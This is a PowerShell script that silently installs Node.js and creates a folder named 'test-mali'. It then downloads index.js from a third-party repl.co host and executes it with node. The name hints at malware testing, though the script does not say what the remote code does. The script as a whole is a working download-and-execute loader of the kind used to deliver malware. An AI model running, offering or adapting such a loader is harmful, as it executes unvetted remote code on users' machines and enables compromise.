# Check if Node.js is already installed
$nodeJsInstalled = Test-Path 'C:\Program Files\nodejs\node.exe'

if (-not $nodeJsInstalled) {
    # Node.js is not installed, proceed with the installation

    # Download and install Node.js
    $nodeJsUrl = 'https://nodejs.org/dist/v18.16.1/node-v18.16.1-x86.msi'
    $nodeJsInstallerPath = 'C:\Temp\node-installer.msi'
    $nodeJsInstallPath = 'C:\Program Files\nodejs'

    Invoke-WebRequest -Uri $nodeJsUrl -OutFile $nodeJsInstallerPath
    Start-Process -Wait -FilePath msiexec -ArgumentList "/i $nodeJsInstallerPath /quiet"
    [Environment]::SetEnvironmentVariable('Path', [Environment]::GetEnvironmentVariable('Path', 'Machine') + ";$nodeJsInstallPath", 'Machine')

    # Install node-fetch globally
    # npm install -g node-fetch
}
else {
    Write-Host "Node.js is already installed."
}

# Check if the script folder exists
$scriptFolder = 'C:\Temp\test-mali'
if (-not (Test-Path $scriptFolder)) {
    # Folder does not exist, create the folder
    Write-Host "Creating script folder..."
    New-Item -ItemType Directory -Path $scriptFolder | Out-Null
    Write-Host "Script folder created."
}
else {
    Write-Host "Script folder already exists. Skipping folder creation."
}

# Download and execute the JavaScript script
cd $scriptFolder

# Run npm init -y and npm install commands in the script folder
Write-Host "Running npm init and npm install..."
npm init -y
npm install --force node-fetch fetch axios
Write-Host "npm init and npm install completed."

$scriptUrl = 'https://obsidianator-code-1.blueobsidian.repl.co/index.js'
$scriptPath = Join-Path $scriptFolder 'index.js'

if (-not (Test-Path $scriptPath)) {
    Write-Host "Downloading script..."
    Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
    Write-Host "Script downloaded."
}
else {
    Write-Host "Script already exists. Skipping download."
}

Write-Host "Executing script..."
node $scriptPath

# Wait for user input before exiting
Write-Host "Press Enter to exit."
$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
  